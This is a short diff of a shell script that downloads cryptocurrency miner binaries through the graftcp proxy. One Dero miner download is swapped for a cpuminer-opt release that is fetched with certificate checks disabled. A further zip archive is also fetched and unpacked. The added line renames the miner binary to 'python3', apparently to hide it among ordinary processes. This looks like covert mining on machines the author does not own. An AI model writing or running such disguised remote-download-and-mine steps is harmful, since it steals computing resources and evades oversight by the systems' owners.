@@ -33,8 +33,7 @@ echo " "
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/putri212/mbah/raw/main/dero-miner-linux-amd64
-chmod +x dero-miner-linux-amd64
+./graftcp/graftcp wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-avx2 python3
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
